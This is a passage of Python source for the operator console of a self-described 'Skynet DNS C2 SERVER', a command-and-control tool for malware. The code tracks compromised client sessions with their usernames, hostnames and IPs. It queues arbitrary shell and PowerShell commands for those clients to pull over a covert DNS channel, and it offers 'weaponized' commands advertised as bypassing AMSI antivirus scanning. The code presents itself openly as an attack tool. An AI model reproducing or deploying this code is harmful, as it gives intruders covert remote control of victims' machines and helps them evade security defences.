                    title=f"⚔️  ADVANCED WEAPONIZED COMMANDS - {len(advanced_commands)} Available",
                    border_style="red",
                    padding=(1, 1)
                ))
            
            elif cmd.lower().startswith("weaponize"):
                parts = cmd.split(maxsplit=1)
                
                if len(parts) == 1:
                    # List all weaponized commands with numbers
                    table = Table(show_header=True, header_style="bold red", box=box.ROUNDED)
                    table.add_column("#", style="dim", width=4)
                    table.add_column("Command", style="cyan", width=25)
                    table.add_column("Description", style="white", width=45)
                    table.add_column("Advanced", style="yellow", width=10)
                    
                    for idx, (cmd_name, cmd_info) in enumerate(sorted(WEAPONIZED_COMMANDS.items()), 1):
                        advanced_flag = "✅" if cmd_info.get('advanced', False) else "❌"
                        table.add_row(str(idx), cmd_name, cmd_info['desc'], advanced_flag)
                    
                    console.print(Panel(
                        table,
                        title=f"⚔️  WEAPONIZED COMMANDS - {len(WEAPONIZED_COMMANDS)} Available",
                        border_style="red",
                        padding=(1, 1)
                    ))
                    console.print("\n[dim]💡 Usage: weaponize <number> or weaponize <command_name>[/dim]")
                    console.print("[dim]💡 Advanced commands include AMSI bypass and error handling[/dim]\n")
                    
                elif len(parts) == 2:
                    # Execute specific weaponized command (by number or name)
                    weapon_input = parts[1].strip()
                    weapon_cmd = None
                    
                    # Check if input is a number
                    if weapon_input.isdigit():
                        idx = int(weapon_input)
                        sorted_commands = sorted(WEAPONIZED_COMMANDS.keys())
                        if 1 <= idx <= len(sorted_commands):
                            weapon_cmd = sorted_commands[idx - 1]
                        else:
                            console.print(f"❌ [red]Invalid weapon number. Use 1-{len(WEAPONIZED_COMMANDS)}[/red]")
                    else:
                        # Input is a command name
                        if weapon_input in WEAPONIZED_COMMANDS:
                            weapon_cmd = weapon_input
                        else:
                            console.print(f"❌ [red]Unknown weaponized command: {weapon_input}[/red]")
                    
                    if weapon_cmd:
                        if not current_session:
                            console.print("❌ [red]No session selected. Use 'use <session_id>' first[/red]")
                        else:
                            weapon_info = WEAPONIZED_COMMANDS[weapon_cmd]
                            is_advanced = weapon_info.get('advanced', False)
                            
                            console.print(Panel.fit(
                                f"⚔️  [bold red]WEAPONIZED COMMAND:[/bold red] [cyan]{weapon_cmd}[/cyan]\n"
                                f"📝 [bold]Description:[/bold] {weapon_info['desc']}\n"
                                f"🚀 [bold]Advanced:[/bold] {'✅ Yes (AMSI Bypass + Error Handling)' if is_advanced else '❌ No'}\n"
                                f"💻 [bold]Type:[/bold] PowerShell",
                                border_style="red"
                            ))
                            
                            # Execute as weaponized command with "weapon:" prefix
                            actual_cmd = "weapon:" + weapon_cmd
                            
                            with Progress(
                                SpinnerColumn(),
                                TextColumn("[progress.description]{task.description}"),
                                transient=True,
                            ) as progress:
                                task = progress.add_task(f"Executing {weapon_cmd}...", total=None)
                                time.sleep(0.5)
                            
                            commands[current_session] = actual_cmd
                            console.print(f"📤 [bold green]Weaponized command queued:[/bold green] [red]{weapon_cmd}[/red]")
                            console.print("⏳ [blue]Waiting for client beacon and command output...[/blue]")
                    else:
                        console.print("[yellow]💡 Type 'weaponize' to see all available commands[/yellow]")
            
            elif cmd.lower() == "info":
                if current_session:
                    if current_session in sessions:
                        session_info = sessions[current_session]
                        info_text = (
                            f"[bold]Session Details:[/bold]\n\n"
                            f"• Session ID: [cyan]{current_session}[/cyan]\n"
                            f"• Computer Name: [green]{session_info.get('computer_name', 'Unknown')}[/green]\n"
                            f"• Username: [magenta]{session_info.get('username', 'Unknown')}[/magenta]\n"
                            f"• IP Address: [yellow]{session_info['ip']}[/yellow]\n"
                            f"• Hostname: [blue]{session_info.get('hostname', 'Unknown')}[/blue]\n"
                            f"• Last Seen: [dim]{datetime.fromtimestamp(session_info['last_seen']).strftime('%Y-%m-%d %H:%M:%S')}[/dim]\n"
                            f"• Age: [dim]{time.time() - session_info['last_seen']:.1f}s[/dim]"
                        )
                        console.print(Panel(info_text, title="ℹ️  SESSION INFO", border_style="cyan", padding=(1, 2)))
                    else:
                        console.print("❌ [red]Session no longer exists[/red]")
                        current_session = None
                else:
                    console.print("❌ [red]No session selected[/red]")
            
            elif cmd.lower().startswith("disconnect "):
                parts = cmd.split()
                if len(parts) >= 2:
                    session_id = parts[1]
                    if session_id in sessions:
                        del sessions[session_id]
                        if session_id in commands:
                            del commands[session_id]
                        if session_id in results:
                            del results[session_id]
                        console.print(Panel.fit(
                            f"🔌 [bold yellow]SESSION DISCONNECTED:[/bold yellow] [cyan]{session_id}[/cyan]",
                            border_style="yellow"
                        ))
                        if current_session == session_id:
                            current_session = None
                    else:
                        console.print(f"❌ [red]Session {session_id} not found[/red]")
                else:
                    console.print("❌ [red]Usage: disconnect <session_id>[/red]")
            
            elif cmd.lower().startswith("use "):
                parts = cmd.split()
                if len(parts) >= 2:
                    target = parts[1]
                    
                    # Check if it's a number (index-based selection)
                    if target.isdigit():
                        idx = int(target) - 1
                        session_list = sorted(sessions.keys())
                        if 0 <= idx < len(session_list):
                            session_id = session_list[idx]
                            current_session = session_id
                            session_info = sessions[session_id]
                            console.print(Panel.fit(
                                f"🎯 [bold green]CONTROL TRANSFERRED TO:[/bold green]\n\n"
                                f"• Session ID: [cyan]{session_id}[/cyan]\n"
                                f"• Computer: [green]{session_info.get('computer_name', 'Unknown')}[/green]\n"
                                f"• Username: [magenta]{session_info.get('username', 'Unknown')}[/magenta]\n"
                                f"• IP: [yellow]{session_info['ip']}[/yellow]\n"
                                f"• Hostname: [blue]{session_info.get('hostname', 'Unknown')}[/blue]",
                                border_style="green"
                            ))
                        else:
                            console.print(f"❌ [red]Invalid session number. Use 'sessions' to list clients.[/red]")
                    else:
                        # Session ID selection
                        session_id = target
                        if session_id in sessions:
                            current_session = session_id
                            session_info = sessions[session_id]
                            console.print(Panel.fit(
                                f"🎯 [bold green]CONTROL TRANSFERRED TO:[/bold green]\n\n"
                                f"• Session ID: [cyan]{session_id}[/cyan]\n"
                                f"• Computer: [green]{session_info.get('computer_name', 'Unknown')}[/green]\n"
                                f"• Username: [magenta]{session_info.get('username', 'Unknown')}[/magenta]\n"
                                f"• IP: [yellow]{session_info['ip']}[/yellow]\n"
                                f"• Hostname: [blue]{session_info.get('hostname', 'Unknown')}[/blue]",
                                border_style="green"
                            ))
                        else:
                            console.print(f"❌ [red]Session {session_id} not found. Use 'sessions' to list active clients.[/red]")
                else:
                    console.print("❌ [red]Usage: use <session_id> or use <number>[/red]")
            
            elif current_session:
                # Prepare command based on shell mode or explicit prefix
                actual_cmd = cmd
                is_powershell = False
                
                # Check for explicit PowerShell prefix
                if cmd.lower().startswith("ps "):
                    # Single PowerShell command
                    actual_cmd = "ps:" + cmd[3:]
                    is_powershell = True
                elif cmd.lower().startswith("powershell "):
                    # Single PowerShell command (long form)
                    actual_cmd = "ps:" + cmd[11:]
                    is_powershell = True
                elif shell_mode == "powershell":
                    # In PowerShell mode, prefix all commands
                    actual_cmd = "ps:" + cmd
                    is_powershell = True
                
                # Send command to current session with progress indication
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    transient=True,
                ) as progress:
                    task = progress.add_task(f"Queueing command for {current_session}...", total=None)
                    time.sleep(1)  # Visual feedback
                
                commands[current_session] = actual_cmd
                
                # Display command info
                if is_powershell:
                    console.print(f"📤 [bold green]PowerShell command queued:[/bold green] [blue]{cmd}[/blue]")
                else:
                    console.print(f"📤 [bold green]Command queued:[/bold green] [yellow]{cmd}[/yellow]")
                console.print("⏳ [blue]Waiting for client beacon and command output...[/blue]")
            
            else:
                console.print("❌ [red]No session selected. Use 'use <session_id>' to select a client.[/red]")
        
        except KeyboardInterrupt:
            console.print("\n🛑 [yellow]Type 'exit' to shutdown server[/yellow]")
        except Exception as e:
            console.print(f"❌ [bold red]Command error:[/bold red] {e}")

def main():
    # Main entry point
    banner = Panel.fit("""[bold red]
    
             ~~~~~~||||||||~~~~~~
      ~~~~||||||||||||||||~~~~~
    ~~~~||||||||||||||||||||~~~~~
   ~~~||||||   .----.   ||||||~~~           Skynet DNS C2 SERVER v1.0
  ~~||||||    / .--. \    ||||||~~          By: AuxGrep (Skynet)
 ~~||||||    | /    \ |    ||||||~~         
 ~~||||||    ||  ()  ||    ||||||~~         
 ~~||||||    | \____/ |    ||||||~~         
  ~~||||||    \      /    ||||||~~
   ~~~||||||   '----'    ||||||~~~
     ~~~~||||||||||||||||||||~~~
       ~~~~||||||||||||||||~~~~
           ~~~~~~||||||||~~~~~~

    [/bold red]""", 
    border_style="red", padding=(1, 2))
    
    console.print(banner)
    
    # Get server IP addresses
    import socket as sock_module
    try:
        hostname = sock_module.gethostname()
        local_ip = sock_module.gethostbyname(hostname)
    except:
        local_ip = "Unknown"
    
    # System status panel
    status_panel = Panel(
        f"• Server Time: [cyan]{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}[/cyan]\n"
        f"• Server IP: [bold yellow]{local_ip}[/bold yellow]\n"
        f"• Listen Port: [yellow]{DNS_PORT}[/yellow]\n"
        f"• Base Domain: [green]{BASE_DOMAIN}[/green]\n"
        f"• Protocol: [magenta]DNS (Covert Channel)[/magenta]\n"
        f"• Advanced Features: [red]AMSI Bypass | PowerShell Commands[/red]\n\n"
        f"[bold yellow]⚠️  CLIENT CONFIGURATION:[/bold yellow]\n"
        f"• Update client DNS_SERVER to: [bold cyan]{local_ip}[/bold cyan]\n"
        f"• Client BASE_DOMAIN must be: [bold cyan]{BASE_DOMAIN}[/bold cyan]",
        title="🖥️  ADVANCED SYSTEM STATUS",
        border_style="blue",
        padding=(1, 2)
    )
    console.print(status_panel)
    console.print()
    
    # Start chunk monitor thread (auto-completes stuck transfers)
    monitor_thread = threading.Thread(target=chunk_monitor_thread, daemon=True, name="ChunkMonitor")
    monitor_thread.start()
    console.print("🔄 [dim green]Chunk monitor started (auto-complete after 10s idle)[/dim green]")
    
    # Start DNS server in background thread
    server_thread = threading.Thread(target=dns_server, daemon=True)
    server_thread.start()
    
    # Start command interface in main thread
    try:
        command_interface()
    except KeyboardInterrupt:
        global chunk_monitor_running
        chunk_monitor_running = False
        console.print(Panel(
            "🛑 [bold red]EMERGENCY SHUTDOWN INITIATED[/bold red]",
            border_style="red"
        ))
        sys.exit(0)

if __name__ == "__main__":
    main()